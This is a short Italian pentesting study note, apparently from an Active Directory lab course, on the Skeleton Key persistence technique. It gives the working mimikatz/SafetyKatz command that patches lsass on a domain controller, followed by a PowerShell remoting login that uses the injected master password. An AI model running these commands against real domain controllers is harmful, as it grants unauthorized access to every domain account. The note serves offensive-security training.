# Persistence - Skeleton Key

* Skeleton key e' una tecnica di persistenza dove e' possibile patchare un DC (lsass process) cosi che permetta l'accesso ad ogni utente mediante una singola password
* Tutti i metodi pubblici conosciuti NON SONO PERSISTENTI a seguito di reboot
* Utiilizza il comando sottostante per fare un inject di una Skeleton Key (la password sara' mimikatz in questo caso) su un DC a scelta. Sono richiesti privilegi Domain Admin (DA)

```powershell
SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -
ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

* Adesso e' possibile accedere qualsiasi macchina con una username valida e usando come password "mimikatz"

```powershell
Enter-PSSession -Computername dcorp-dc -credential
dcorp\Administrator
```

#### Notare che la tecnica Skeleton Key non e' OPSEC e causa anche problemi noti con AD CS
